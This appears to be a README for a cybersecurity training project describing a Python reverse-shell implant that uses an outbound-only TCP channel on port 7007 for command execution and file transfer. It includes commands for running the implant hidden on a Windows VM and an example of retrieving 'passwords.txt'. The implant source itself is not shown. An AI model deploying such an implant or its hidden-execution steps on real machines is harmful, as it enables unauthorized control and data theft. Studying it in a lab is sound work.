# Week 6 Project – Agent 007

A Python-based reverse shell with file transfer capabilities, simulating a C2 (Command & Control) channel over a restricted firewall using only outbound TCP on port 7007.

---

## How It Works

The target machine (Windows VM) is behind a strict firewall – no inbound connections allowed, only outbound TCP on port 7007. The implant running on the VM initiates the connection to the server, keeping the channel open for remote control.

```
Controller (Host)                    Implant (Windows VM)
     server.py          <-------         client.py
     - accepts connection               - connects outbound on port 7007
     - sends commands                   - executes commands
     - sends/receives files             - sends/receives files
```

---

## Features

- Remote command execution (`cmd:`)
- File transfer to the VM (`send:`)
- File retrieval from the VM (`get:`)
- Persistent connection – implant reconnects automatically
- Works across two machines (configurable host IP via argument)

---

## Requirements

- Python 3.x
- No external dependencies – standard library only (`socket`, `subprocess`, `pathlib`, `sys`, `time`)

---

## Setup

### Firewall Configuration (Windows VM)

Run in PowerShell as Administrator:

```powershell
# Block all inbound traffic
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block

# Block all outbound traffic
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Block

# Allow only outbound TCP on port 7007
New-NetFirewallRule -DisplayName "Allow Out 7007" -Direction Outbound -Protocol TCP -RemotePort 7007 -Action Allow
```

---

## Usage

### Start the Server (Host/Controller)

```bash
python3 control_server.py              # uses default IP
python3 control_server.py 192.168.x.x  # specify host IP
```

### Start the Implant (Windows VM)

```bash
python3 remote_client.py              # uses default IP
python3 remote_client.py 192.168.x.x  # specify server IP
```
**or in silent mode**
```bash
Start-Process pythonw -ArgumentList "remote_client.py" -WindowStyle Hidden # uses default IP
Start-Process pythonw -ArgumentList "remote_client.py 192.168.x.x" -WindowStyle Hidden # specify server IP
```

### Available Commands

| Command | Description | Example |
|---|---|---|
| `cmd:<command>` | Execute a shell command on the VM | `cmd:whoami` |
| `send:<filename>` | Send a file from host to VM | `send:payload.txt` |
| `get:<filename>` | Retrieve a file from VM to host | `get:passwords.txt` |

---

## Project Structure

```
week6-project-007/
├── server.py       # Runs on the controller/host
├── client.py       # Runs on the compromised VM (implant)
└── README.md
```

---

## Educational Purpose

This project was built as part of a Cyber Security training program. It demonstrates core concepts of:

- Reverse shells and C2 communication
- Firewall evasion via outbound-only connections
- Raw TCP socket programming in Python
- Binary file transfer over a custom protocol

> ⚠️ For educational use only. Do not use on systems you do not own or have explicit permission to test.